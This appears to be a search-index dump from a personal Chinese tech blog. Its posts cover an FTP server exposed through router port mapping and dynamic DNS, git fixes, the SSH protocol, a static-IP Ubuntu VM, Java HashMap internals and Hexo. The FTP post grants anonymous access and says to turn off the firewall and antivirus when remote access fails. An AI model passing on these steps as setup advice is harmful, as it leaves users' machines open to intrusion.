选择路由器FTP服务请求端口映射，传递外网的FTP请求到我的主机上 考虑到方便输入FTP服务器网址，已经防止网络运营商动态分配公网IP地址到路由器上，选择使用了花生壳来作为一个域名解析器  前期工作 分辨自己路由器IP是真实的公网IP   点击该 链接 得到自己当前的IP地址。\n  环境：Windows10—打开一个命令提示窗口\ntracert 108.216.***.***(输入刚才得到的IP地址)\n  如果只有一跳那就说明你的路由器上面是有公网IP地址的，如果超过一跳那就肯定是内网IP地址了。\n  如果本地主机的上层路由器是有公网IP地址(后面给外网的用户使用的来访问你内网FTP服务器的IP地址)的，那就可以进行下一步操作了。\n本地搭建FTP服务器 在Windows下面来搭建FTP服务器是比较简单的，并不需要你再去下载一些其他的工具软件了，微软已经提供了FTP服务在系统中，你只需要做的就是打开对应的服务，建立自己的网站就好了，主要步骤：\n 打开Windows10里面的FTP服务功能  创建FTP服务器  本地测试FTP服务器是否工作  启动ftp和iis服务功能 控制面板-\u0026gt;程序和功能-\u0026gt;打开或关闭windows功能\n在功能服务中找到Internet信息服务下面的FTP服务器和Web管理工具，将这两个全部勾选\n添加FTP站点 控制面板-\u0026gt;系统和安全-\u0026gt;管理工具-\u0026gt;(左面菜单中)服务\n之后选择一个本地路径来作为FTP的根服务\n绑定IP地址，这里绑定的IP地址就是自己的内网路由器分配给你的地址，可以通过CMD的ipconfig进行查询，查到自己当前使用的网络适配器下面的局域网分配的IP地址是多少。\n所以我们就可以把这个内网的IP地址绑定上去192.168.1.149，然后指定用户和用户组可以访问该FTP服务器或任意人均可访问。由于在这里，我只是用这个来短时间传递一些视频的大文件，所以我选择的是所有用户均可以访问。\n到这里差不多就设置完成了，可以打开网页输入ftp://192.168.1.149进行测试，如果能够显示出来自己设置的根文件下面的文件内容，那表示测试成功，FTP服务器已经搭建完成。\n FTP服务器还涉及到一些权限设置方面的工作，可参考博客：\nwindows 搭建ftp服务器与权限控制\nWindows下搭建FTP服务器\n  路由器端口映射 上述搭建的FTP服务器仅仅能够在本地和局域网内部使用，因为外网是没有办法访问到你这个内网的网络IP地址的，路由器端口映射，路由映射FTP服务访问端口。因为公网IP是在路由器上的，外网访问时，需要经过路由，需要在路由器上做端口映射，将内网FTP服务访问端口打通。\n端口映射(两种方式) 1.使用DMZ服务 TP-LINK路由器端口映射位置：转发规则/DMZ主机/启用DMZ并添加允许外网访问内网FTP服务器。我的FTP服务器内网地址是192.168.1.49.\n使用DMZ服务有一个缺陷，这就相当于把我们的本地主机的所有端口都暴露在网络上的，这并不是我们比较想要的处理方式。\n2.使用虚拟服务器来完成端口映射 TP-LInk路由器点击转发规则——虚拟服务器，做好端口映射，如图(这里我使用的是网络图片：我们应该使用的IP地址是自己本地的局域网内地址)：\n端口映射中，IP地址就是服务器内网IP是192.168.1.149.端口号就是21，要与FTP服务使用端口号（21）保持一致。协议选择ALL即可，勾选启用，然后保存即可。\n到这里，我们就可以尝试在外网访问我们的FTP服务器了，访问地址：\nftp://你的路由器公网地址\n 当使用=公网IP无法访问，内网IP可以访问的时候，一般是杀毒软件或者防火墙问题，以windows 10 为例，在网络连接-属性-高级-防火墙设置，关闭防火墙。如果依旧不行，请关闭杀毒软件再进行尝试。\n  使用花生壳进行域名解析 使用FTP服务器，在实际使用中，我们的路由器公网IP地址可能发生变化，原因是：每次重启路由器，我们的网络供应商可能重新分配公网IP到这个路由器上面，这就会造成我们的FTP服务器不能访问。\n解决方案：选择花生壳软件完成域名的动态解析，域名固定，即使我们的路由器公网地址变化，只要你在本地运行的花生壳软件客户端，就可以实时绑定最新的地址到我们的域名地址。(最主要的原因：这个软件是免费的)\n下载并安装花生壳客户端 1.下载并安装 2.登陆客户端(需要先注册一个账号，才能得到一个免费的域名) 3.确定是否绑定了域名 使用您在花生壳官网注册的帐号名和密码填入花生壳客户端软件中进行登陆；登录Oray帐号之后，在主界面上面点击域名列表，进入到域名列表的管理界面。\n点击域名诊断，确定动态域名解析结果：\n如果得到的域名结果就是自己路由器的公网地址，那么外网的电脑就可以通过这个域名来访问你的FTP服务器了，即使你的主机处在局域网内。\n 可查看花生壳软件的官网说明文档，但是不推荐使用它提到的FTP服务器软件(能够直接使用微软的服务，为何还用下载软件安装到自己的电脑上面呢)\n使用花生壳服务搭建FTP服务器\n","date":1526779832,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526779832,"objectID":"6dd88c8025ce8725b09e81411bbb07a0","permalink":"http://www.guozet.me/post/FTP-server-by-oray/","publishdate":"2018-05-20T01:30:32Z","relpermalink":"/post/FTP-server-by-oray/","section":"post","summary":"前言 在实际网络环境中很多时候我们需要在局域网内两台电脑之间，外网与局域网内部的电脑之间完成大文件的传输，在这里就会出现一个小问题，常规的小文件我们只需要使用QQ或者Skype这一类的即时聊天软件就可以办到，但是当我们的文件有几十个G那么大的时候，局域网内与外网之间进行大文件传输就没有那么方便了。\n背景 我的主机：Windows 10 旗舰版(路由器下面的局域网内)\n对方主机：Mac(不与我的主机在一个局域网内)\n要求: 需要将大约30G的10个视频文件传送到对方主机上面\n","tags":null,"title":"花生壳作为域名解析来搭建FTP服务器","type":"post"},{"authors":null,"categories":"Git","content":"Git子模块:仓库中包含另外一个仓库 场景 在工作的项目中需要包含另外的项目，这个时候我们就需要引出其他的项目，但是我们希望在引入的项目变化的时候，我们也可以很快的合并到我们现有的分支中。\n操作指令 现有repo加入子repo 在你想要添加的目录位置输入添加子repo的命令即可\ngit submodule add https://github.com/guozetang/paper_code_tracker\r 查看状态参数： git status\n在repo(不是子repo)的根目录查看当前加入的子模块(子repo)。\n$ cat .gitmodules\r[submodule \u0026quot;python/paper_code_tracker\u0026quot;]\rpath = python/paper_code_tracker\rurl = https://github.com/guozetang/paper_code_tracker\r 提交添加的子模块 $ git commit -am \u0026quot;added subproject module\u0026quot;\r[master (root-commit) 9168027] added subproject module\r2 files changed, 7 insertions(+)\rcreate mode 100644 .gitmodules\rcreate mode 160000 python/paper_code_tracker\r 其他更多操作请参考: 【Git】子模块：一个仓库包含另一个仓库\n分支操作 场景 开发过程中经常用到从master分支copy一个开发分支,进行开发\n操作指令介绍 $git checkout master //切换到被copy的分支（master）\r$git pull //从远端拉取最新版本\r$git checkout -b NewBranch //Switched to a new branch 'dev'\r$git push origin NewBranch //新建分支push到远端\r 遇到的问题 $git pull\rThere is no tracking information for the current branch.\rPlease specify which branch you want to merge with.\rSee git-pull(1) for details.\rgit pull \u0026lt;remote\u0026gt; \u0026lt;branch\u0026gt;\rIf you wish to set tracking information for this branch you can do so with:\rgit branch --set-upstream-to=origin/\u0026lt;branch\u0026gt; NewBranch\r 经过验证，当前的分支并没有和本地分支关联，根据提示进行下一步：\n关联\n$git branch --set-upstream-to=origin/NewBranch\n注意：这里branch之后都是没有空格的，如果有空格则是错误命令\n再次拉取\n$git pull\n 关联远程repo 场景 我们经常由于一起不知道的问题，造成我们需要删除.git文件夹之后，使用git init来新建一个文件夹，这时候就需要我们将新建的repo关联到远程的repo上去。\n操作命令介绍 在本地目录下关联远程repository git remote add origin git@github.com:git_username/repository_name.git\r 取消本地目录下关联的远程库： git remote remove origin\r 文件操作 场景 如果一个文件不小心被删除了，可以有两种方法恢复。\n操作命令介绍 1、需要记住所需恢复文件的名字和版本号(commit id)\ngit checkout commit_id -- file_name\r fatal: remote origin already exists. 如果输入:\n$ git remote add origin git@github.com:djqiang（github帐号名）/gitdemo（项目名）.git\n提示出错信息：fatal: remote origin already exists.\n解决办法如下：\n1、先输入$ git remote rm origin\n2、再输入$ git remote add origin git@github.com:djqiang/gitdemo.git 就不会报错了！\n3、如果输入$ git remote rm origin 还是报错的话，error: Could not remove config section \u0026lsquo;remote.origin\u0026rsquo;. 我们需要修改gitconfig文件的内容\n4、找到你的github的安装路径，我的是\nC:\\Users\\ASUS\\AppData\\Local\\GitHub\\PortableGit_ca477551eeb4aea0e4ae9fcd3358bd96720bb5c8\\etc\n5、找到一个名为gitconfig的文件，打开它把里面的[remote \u0026ldquo;origin\u0026rdquo;]那一行\n删掉就好了！\nPermission denied (publickey) 如果输入:\n$ ssh -T git@github.com\n出现错误提示：Permission denied (publickey).因为新生成的key不能加入ssh就会导致连接不上github。\n解决办法如下：\n1、先输入$ ssh-agent，再输入$ ssh-add ~/.ssh/id_key，这样就可以了。\n2、如果还是不行的话，输入ssh-add ~/.ssh/id_key 命令后出现报错Could not open a connection to your authentication agent.解决方法是key用Git Gui的ssh工具生成，这样生成的时候key就直接保存在ssh中了，不需要再ssh-add命令加入了，其它的user，token等配置都用命令行来做。\n3、最好检查一下在你复制id_rsa.pub文件的内容时有没有产生多余的空格或空行，有些编辑器会帮你添加这些的。\nerror:failed to push som refs to \u0026hellip;\u0026hellip;. 如果输入:\n$ git push origin master\n提示出错信息：error:failed to push som refs to \u0026hellip;\u0026hellip;.\n解决办法如下：\n1、先输入$ git pull origin master //先把远程服务器github上面的文件拉下来\n2、再输入$ git push origin master\n3、如果出现报错 fatal: Couldn\u0026rsquo;t find remote ref master或者fatal: \u0026lsquo;origin\u0026rsquo; does not appear to be a git repository以及fatal: Could not read from remote repository.\n4、则需要重新输入$ git remote add origin git@github.com:djqiang/gitdemo.git\n使用git在本地创建一个项目的过程 $ makdir ~/hello-world //创建一个项目hello-world $ cd ~/hello-world //打开这个项目 $ git init //初始化 $ touch README $ git add README //更新README文件 $ git commit -m 'first commit' //提交更新，并注释信息“first commit” $ git remote add origin [git@github.com:defnngj/hello-world.git](mailto:git@github.com:defnngj/hello-world.git) //连接远程github项目 $ git push -u origin master //将本地项目更新到github项目上去\r Permission denied(publickey) ➜ workspace_config git:(document) git push origin document\rPermission denied (publickey).\rfatal: Could not read from remote repository.\rPlease make sure you have the correct access rights\rand the repository exists.\r Solution:\n Testing: $ssh -T git@github.com If there is a mistake about: Permission Dnied(publickey), this is because your new private key is not fit with the public key in the server. Input: $ssh-agent, after that, you can inputssh-add ~/.ssh/id_key  fatal: Could not read from remote repository. ➜ workspace_config git:(document) git push origin document\rPermission denied (publickey).\rfatal: Could not read from remote repository.\rPlease make sure you have the correct access rights\rand the repository exists.\r  关联两个Rep:一个开发repo，一个release的repo 使用场景 团队在一个private的仓库(repo1)中进行项目的开发, 但是在开发的某一个进度的时候，想将这一个版本发布出去，这就需要建立另外一个repo2来管理发布的项目。我们想实现能够在开发的repo1里面添加直接将code push 到 repo2里面去。、\n操作命令介绍 先检查自己当前的远程分支\ngit remote -v\rgithub https://github.com/zxbetter/test.git (fetch)\rgithub https://github.com/zxbetter/test.git (push)\r 然后添加另外一个管理项目发布的repo2\ngit remote add oschina https://git.oschina.net/zxbetter/test.git\r 注意，这里的名字有点区别，repo1对应的名字是github test, 而repo2对应的名字是oschina test\ngit push oschina test\r 关于关联两个repo的其他用法参考博客： 一个项目push到多个远程Git仓库\n","date":1526141671,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526141671,"objectID":"3caa4996f507b8c97ca06495b2f1bf5b","permalink":"http://www.guozet.me/post/Some-git-common-commands-in-life/","publishdate":"2018-05-12T16:14:31Z","relpermalink":"/post/Some-git-common-commands-in-life/","section":"post","summary":"Git子模块:仓库中包含另外一个仓库 场景 在工作的项目中需要包含另外的项目，这个时候我们就需要引出其他的项目，但是我们希望在引入的项目变化的时候，我们也可以很快的合并到我们现有的分支中。\n","tags":"Git","title":"Git不同场景常用命令","type":"post"},{"authors":null,"categories":"Linux","content":"前言 最近使用SSH来登陆DigitalOcean VPS的时候，第一次导入SSH的时候出现了一些问题，由此对SSH协议详细的学习了一番。在这里对自己SSH的学习做一个小结。\n基本概念 什么是SSH SSH(The Secure Shell)是指一种将所有传输的数据进行加密，这样\u0026quot;中间人\u0026quot;这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、Pop、甚至为PPP提供一个安全的\u0026quot;通道\u0026rdquo;。\n 官方协议文档请参考: The Secure Shell (SSH) Protocol Architecture\n SSH基本框架 SSH协议分三部分：\n  传输层协议（The Transport Layer Protocol）提供服务器认证，数据机密性，信息完整性 等的支持；\n  用户认证协议（The User Authentication Protocol） 则为服务器提供客户端的身份鉴别；\n  连接协议（The Connection Protocol） 将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。\n  SSH的秘钥管理 SSH协议要求每一个使用本协议的主机都必须至少有一个自己的主机密钥对，服务方通过对客户方主机密钥的认证之后，才能允许其连接请求。一个主机可以使用多个密钥，针对不同的密钥算法而拥有不同的密钥，但是至少有一种是必备的。SSH协议关于主机秘钥认证的方案有两种。\n方案一 在第一种方案中，主机将自己的公用密钥分发给相关的客户机，客户机在访问主机时则使用该主机的公开密钥来加密数据，主机则使用自己的私有密钥来解密数据，从而实现主机密钥认证，确定客户机的可靠身份。在图2（a）中可以看到，用户从主机A上发起操作，去访问，主机B和主机C，此时，A成为客户机，它必须事先配置主机B和主机C的公开密钥，在访问的时候根据主机名来查找相应的公开密钥。对于被访问主机（也就是服务器端）来说则只要保证安全地存储自己的私有密钥就可以了。\n另外，SSH协议框架中还允许对主机密钥的一个折中处理，那就是首次访问免认证。首次访问免认证是指，在某客户机第一次访问主机时，主机不检查主机密钥，而向该客户都发放一个公开密钥的拷贝，这样在以后的访问中则必须使用该密钥，否则会被认为非法而拒绝其访问。 方案二 第二种方案中，存在一个密钥认证中心，所有系统中提供服务的主机都将自己的公开密钥提交给认证中心，而任何作为客户机的主机则只要保存一份认证中心的公开 密钥就可以了。在这种模式下，客户机在访问服务器主机之前，还必须向密钥认证中心请求认证，认证之后才能够正确地连接到目的主机上。\nSSH的工作过程 在整个通讯过程中，为实现 SSH的安全连接，服务器端与客户端要经历如下五个阶段：\n  客户端连接到服务器上，进行SSH协议版本协商\n  服务器向客户端提供自己的身份证明和会话参数\n  客户端给服务器发送一个（会话）密钥\n  双方启用加密并完成服务器认证\n  建立安全连接\n  每个阶段均涉及到客户端与服务端的多次交互，通过这些交互过程完成包括证书传输、算法协商、通道加密等过程。\n客户端连接到服务器上，进行SSH协议版本协商   服务器打开端口 22，等待客户端连接。\n  客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－\u0026lt;主协议版本号\u0026gt;.\u0026lt;次协议版本号\u0026gt;－\u0026lt;软件版本号\u0026gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。\n   这些协议是以 ASCII 字符串(明文)表示，例如：SSH-1.5-1.2.27，其意义为SSH协议，版本号是V1.5，SSH1实现版本为1.2.27。\n ➜ telnet 165.227.65.39(测试一个服务器地址) SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4   客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。\n  客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。\n  如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。\n   如果客户端和服务器确定其协议版本号是兼容的，那么连按就继续进行，否则，双方都可能决定中断连接。例如，如果一个只使用 SSH-1 的客户端连接到一个只使用 SSH-2 的服务器上，那么客户端就会断开连接并打印一条错误消息。实际上还可能执行其他操作：例如，只使用SSH-2的服务器可以调用SSH-1服务器来处理这次连接请求。\n Note： 版本号协商阶段报文都是采用明文方式传输的。\n协议版本号交换过程一旦完成，客户端和服务器都立即从下层的 TCP 连接切换到基于子报文的协议。每个报文都包含一个32位的字段，1 - 8字节的填充位[ 用来防止已知明文攻击unknown-plaintext attack ]，一个1字节的报文类型代码, 报文有效数据和一个4字节的完整性检査字段。\n服务器向客户端提供自己的身份证明和会话参数 服务器向客户端发送以下信息(现在还沒有加密):\n主机密钥（Host Key），用于后面证明服务器主机的身份 服务器密钥（Server Key），用来帮助建立安全连接 8个随机字节序列，称为检测字节（check bytes)。客户端在下一次响应中必须包括这些检测字节，否則服务器就会拒绝接收响应信息，这种方法可以防止某些 IP伪装攻击(IP spoofing attack)。 该服务器支持的加密、压缩和认证方法 此时，双方都要计算一个通用的 128 位会话标识符(Session ID)。它在某些协议中用来惟一标识这个 SSH 会话。该值是 主机密钥（Host Key）、服务器密钥（Server Key）和检测字节（check bytes)一起应用 MD5散列函数 得到的结果。\n当客户端接收到 主机密钥（Host Key）时，它要进行询问：“之前我和这个服务器通信过吗？如果通信过，那么它的主机密钥是什么呢？”要回答这个问题，客户端就要査阅自己的已知名主机数据库。如果新近到达的主机密钥可以和数据库中以前的一个密钥匹，那么就没有问题了。\n但是，此时还存在两种可能：已知名主机数据库中没有这个服务器，也可能有这个服务器但是其主机密钥不同。在这两种情况中，客户端要选择是信任这个新近到达的密钥还是拒绝接受该密钥。此时就需要人的指导参与了，例如，客户端用户可能被提示要求确定是接受还是拒绝该密钥。\nThe authenticity of host 'ssh-server.example.com (12.18.429.21)' can't be established. RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d. Are you sure you want to continue connecting (yes/no)?  如果客户端拒绝接受这个主机密钥，那么连接就中止了。让我们假设客户端接受该密钥，现在继续介绍。\n  客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。\n  服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。\n  客户端从认证方法列表中选取一种认证方法再次进行认证。\n  该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。\n   SSH提供两种认证方式：\n password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。 publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息  SSH2.0还提供了 password-publickey 认证和 any 认证:\n password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。 any认证：指定该用户的认证方式可以是 password，也可以是 publickey。   ","date":1526141671,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526141671,"objectID":"74bc40308e7df61a17853598bc860930","permalink":"http://www.guozet.me/post/Linux-SSH-introduce/","publishdate":"2018-05-12T16:14:31Z","relpermalink":"/post/Linux-SSH-introduce/","section":"post","summary":"前言 最近使用SSH来登陆DigitalOcean VPS的时候","tags":"Linux","title":"SSH协议解析","type":"post"},{"authors":null,"categories":"Network","content":"前言 每次使用学校Lab的时候，都会有在需要安装软件或者更新软件的时候，由于没有Root权限而导致自己需要重新想办法处理，或者换到VPS上去处理的情况发生。每当这个时候，都在考虑，是否可以在VM中构建一个自己在任何地方都可以访问的服务器？\n解决方案 设置静态IP地址 背景\n在虚拟机下运行操作系统，尤其是Linux系统已经是非常常见的做法。有时你想在虚拟机下搭建一个(模拟)服务器来供主机访问，比如搭建一个telnet/ssh。此时你会发现，每次启动虚拟机，VMWare为虚拟机系统分配一个动态IP，这样每次去连接虚拟机的telnet时很不方便。如果设成静态IP就好了。\nVMnet8和NAT\n如果你的虚拟机是以NAT方式连入互联网的话，那么虚拟机的IP地址非配，网关以及互联网访问权限均由VMWare提供的叫做VMnet8虚拟网卡所提供。所以一切和设置静态IP有关的设置都可以从这里找到。通VMnet8虚拟网卡，主机可以访问虚拟机的IP，虚拟机可以连入主机的互联网连接连入外网。\n确认VMnet8虚拟网卡已启用\n在默认情况下，VMWare Workstation已经启用VMnet8虚拟网卡，Windows 7下，通过进入 控制面板\u0026gt;网络和Internet\u0026gt;网络和共享中心\u0026gt;更改适配器设置 可以查看该虚拟网卡的状态。如图1-1所示。\n得到可用IP范围、网关和子网掩码\n在VMWare主界面，点击Edit\u0026gt;Virtual Network Editor菜单进入虚拟网卡参数设置界面（图1-2）。选择VMnet8条目，点击NAT Settings按钮后可以看到我们的VMWare Workstation为NAT连接的虚拟机设定的默认网关，此处为192.168.91.2，以及子网掩码，此处为255.255.255.0, 如图1-3所示。\n点击DHCP Settings按钮，可以看到VMnet8为虚拟机分配的可用的子网IP范围，如图1-4所示。\n在这里，我们可以得到 OK，至此，所有我们需要的信息都已经获取到，这里汇总一下，\n  子网IP可用范围：192.168.91.128~192.168.91.254\n  子网掩码：255.255.255.0\n  网关: 192.168.91.2\n  下面开始进入Ubuntu虚拟机设置静态IP。\nUbuntu设置IP得知\n 启动虚拟机Ubuntu系统，打开终端，利用如下命令打开并编辑网络接口配置文件：  sudo vi /etc/network/interfaces 2. 编辑文件如下：\n复制代码 auto lo iface lo inet loopback\nAssgin static IP by eric on 26-SEP-2012 iface eth0 inet static address 192.168.91.200 #change to your static IP netmask 255.255.255.0 #change to your netmask gateway 192.168.91.2 #change to your getway #We must specify dns-nameserver here #in order to get internet access from host dns-nameservers 192.168.91.2 auto eth0 复制代码 说明\naddress是你要分配给你虚拟机的静态IP地址，可以从刚才我们找到的可用的子网IP范围中随便选择一个放在此处。\nnetmask是子网掩码\ngateway是网关\n注意：在相对较早的版本中，你需要设置/etc下的resolv.conf文件，并加入nameserver，这样才可以连接互联网。但在Ubuntu 12.04之后，已经不推荐这种方式了，因为无论你想该配置文件中设置什么值，重新启动之后都会被还原为初始状态。推荐的做法是直接在interfaces配置文件中加入dns-nameserver \u0026lt;网关IP\u0026gt;这一行。\n重启ubuntu的网卡  sudo /etc/init.d/networking restart 4. ping测试互联网连通性\nping www.baidu.com 如果ping有响应，那么恭喜你，你已经成功将虚拟机设置为静态IP，并且也已连入互联网。\n开启防火墙 ufw enable\n关闭防火墙 ufw disable\n如果虚拟机里能ping同本机，而本机却ping不通虚拟机，或者虚拟机不能ping通本机，可能有如下原因：\n一，如果是桥接模式，那么可能性1：虚拟机防火墙禁ping，请关闭虚拟机防火墙重试；可能性2：桥接设置的ip有冲突或者是虚拟机桥接服务不正常。\n二，如果是nat模式，那么可能性1：虚拟机防火墙禁ping，请关闭虚拟机防火墙重试；可能性2：本机上的vmnet8网卡被禁用了。可能性3：vbox的nat模式，vpc的共享模式，本来就这样的。\n三，如果主机同时装了visualbox和vm，也会导致其中一个虚拟机ping不通主机，因此使用vm或vb时，在主机上禁用另一个虚拟网卡即可。\nSSH分客户端openssh-client和openssh-server 如果你只是想登陆别的机器的SSH只需要安装openssh-client（ubuntu有默认安装，如果没有则sudo apt-get install openssh-client），如果要使本机开放SSH服务就需要安装openssh-server sudo apt-get install openssh-server 然后确认sshserver是否启动了： ps -e |grep ssh 如果看到sshd那说明ssh-server已经启动了。 如果没有则可以这样启动：sudo /etc/init.d/ssh start 或者 service ssh start ssh-server配置文件位于/etc/ssh/sshd_config，在这里可以定义SSH的服务端口，默认端口是22，你可以自己定义成其他端口号，如222。 然后重启SSH服务： sudo /etc/init.d/ssh stop sudo /etc/init.d/ssh start 然后使用以下方式登陆SSH： ssh username@192.168.1.112 username为192.168.1.112 机器上的用户，需要输入密码。\n在刚安装完ubuntu后，屏幕不能全屏显示，此时：\n1、安装VMware Tools\n步骤：\n1.1 进入ubuntu系统后，点击虚拟机上的【虚拟机】-\u0026gt;【安装 vmware tools】，回到桌面回看到一个vmware tools的  cdrom图标。\n1.2 复制 VMwareTools-10.0.10-4301679.tar.gz（版本根据自己的实际情况） 到/home/lance/目录下。 用命令【tar -xzvf VMwareTools-10.0.10-4301679.tar.gz】解压。\r1.3 解压后 cd vmware_tools_distrib，打开终端\r1.4 输入“sudo ./vmware-install.pl”，输入用户密码便可开始安装了。\r1.5 接下来N多的enter，N多的YES，自己慢慢按吧。\r1.6 直到你看到—the vmware team 后 reboot 重启即可\r1.7 若还没有全屏显示，则将虚拟机的【查看】-\u0026gt;【自动调整大小】-\u0026gt;【自适应客户机】,都选上。即可实现全屏。\r1.8 安装vmware tools实现全屏后，即也实现了在主机（WIN7）和虚拟机VMware （ubuntu）间直接拖拽文件。\r enjoy yourself\nUbuntu 16.04 执行下面命令默认启动到命令行： $ sudo systemctl set-default multi-user.target 执行如下命令启动到桌面： $ sudo systemctl start lightdm\n","date":1526088632,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526088632,"objectID":"5f3a7a227e9c03f69f6a2b7c4877c81b","permalink":"http://www.guozet.me/post/Set-a-Ubuntu-in-the-VM/","publishdate":"2018-05-12T01:30:32Z","relpermalink":"/post/Set-a-Ubuntu-in-the-VM/","section":"post","summary":"前言 每次使用学校Lab的时候，都会有在需要安装软件或者更新软件的时候，由于没有Root权限而导致自己需要重新想办法处理，或者换到VPS上去处理的情况发生。每当这个时候，都在考虑，是否可以在VM中构建一个自己在任何地方都可以访问的服务器？\n","tags":"Linux","title":"在VMware内构建一个外网可以访问的Ubuntu服务器","type":"post"},{"authors":null,"categories":null,"content":" HashMap相关 常用函数说明 如何在Hashmap中插入相同的key值 要在HashMap中插入重复的值，首先需要弄清楚HashMap里面是怎么存放元素的。\nput方法: Map里面存放的每一个元素都是key-value这样的键值对，而且都是通过put方法进行添加的，而且相同的key在Map中只会有一个与之关联的value存在。put方法在Map中的定义如下。\nput(K key, V value);\n put()方法实现：首先hash(key)得到key的hashcode()，hashmap根据获得的hashcode找到要插入的位置所在的链，在这个链里面放的都是hashcode相同的Entry键值对，在找到这个链之后，会通过equals()方法判断是否已经存在要插入的键值对，而这个equals比较的其实就是key。\n public V put(K key,V value) Parameters: key - key with which the specified value is to be associated value - value to be associated with the specified key Return: the previous value associated with key, or null if there was no mapping for key.  它用来存放key-value这样的一个键值对，返回值是key在Map中存放的旧value，如果之前不存在则返回null。HashMap的put方法是这样实现的。\npublic V put(K key, V value) { if (key == null) return putForNullKey(value); int hash = hash(key); for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; }  从上我们可以看到在添加对应的key-value这样的组合时，如果原本已经存在对应的key，则直接改变对应的value，并返回旧的value，而在判断key是否存在的时候是先比较key的hashCode，再比较相等或equals的。 直接从上面代码来看是比较的对应Map.Entry的hashCode和key的hashCode，而实际上Map.Entry的hashCode其实就是其存放key的hashCode。而如果对应的key原本不存在的话将调用addEntry将对应的key-value添加到Map中。addEntry传递的参数hash就是对应key的hashCode。 实现添加重复元素 通过对put()方法的研究，我们可以发现，判断key是否存在的时候是先比较key的hashCode，再比较相等或equals的，所以重写hashCode()和equals()方法即可实现添加重复元素。\n@Override public int hashCode(){ return this.arga.hashCode() * this.argb.hashCode() ; } @Override public boolean equals(Object obj) { if (this == obj) { return true; } if (!(obj instanceof MyType)) { return false; } MyType p = (MyType) obj; if (this.arga.equals(p.arga) \u0026amp;\u0026amp; this.argb.equals(p.argb)) { return true ; } else { return false ; } }  重写这两个方法之后就可以覆盖重复的键值对，如果需要对value进行叠加，调用put()方法之前用containsKey()方法判断是否有重复的键值，如果有，则用get()方法获取原有的value，再加上新加入的value即可。\n","date":1526048905,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526048905,"objectID":"2682d42e8910d5056d2363d0ec83eef1","permalink":"http://www.guozet.me/post/Record-some-java-Function-when-I-code-on-Leetcode/","publishdate":"2018-05-11T14:28:25Z","relpermalink":"/post/Record-some-java-Function-when-I-code-on-Leetcode/","section":"post","summary":"HashMap相关 常用函数说明 如何在Hashmap中插入相同","tags":null,"title":"Record some java Function when I code on Leetcode","type":"post"},{"authors":null,"categories":"Life","content":"使用Jekyll搭建在github上博客已经快一年了，但一年的时间并没有写很多的文章。一部分原因是由于自己懈怠，另一部分也由于Jekyll写博客有很多不便之处。不能自动生成目录，以及每次新建文章都需要自己的手动设置目录结构以及添加Jekyll解析的格式内容在每一篇文章中，这是一件非常繁琐而无趣的工作。遵循自己动手丰衣足食的原则，查询目前比较流行的搭建博客的方式之后，决定使用Hero+Next主题在github上搭建博客。本篇博客记录搭建过程中的配置与优化。\n 具体搭建博客过程请参考：\n   Jekyll迁移到Hexo搭建个人博客\n适合熟悉原理的同学，作者详细的讲解了使用Hexo与Next主题搭建博客的过程。\n  如果完全不熟悉Hexo的原理以及之前没有使用过git的同学，请参考：\n使用 Hexo 基于 GitHub Pages 搭建个人博客（一）\n使用 Hexo 基于 GitHub Pages 搭建个人博客（二）\n   完成Hexo搭建博客之后，可以参考一些配置说明,做一些优化：\n 使用 Hexo 基于 GitHub Pages 搭建个人博客\nHexo基本操作 基本命令 hexo new \u0026quot;postName\u0026quot; #新建文章\rhexo new page \u0026quot;pageName\u0026quot; #新建页面\rhexo generate #生成静态页面至public目录\rhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\rhexo deploy #将.deploy目录部署到GitHub\rhexo help # 查看帮助\rhexo version #查看Hexo的版本\rhexo deploy -g #生成加部署\rhexo server -g #生成加预览\r命令的简写\rhexo n == hexo new\rhexo g == hexo generate\rhexo s == hexo server\rhexo d == hexo deploy\r  Hexo 文章图片管理 数无形时少直觉，很多时候一个配图能清晰的表达我们的观点。所以，我们需要研究Hexo写文章时插入图片的方法。主要有两种方式：\n本地引用\n  适用场景： 少量图片 + Blog搭载平台空间充足\n  优势： 简洁方便\n  远程图床引用\n 适用场景：深度使用用户 + 文章插入图片的需求较高 + 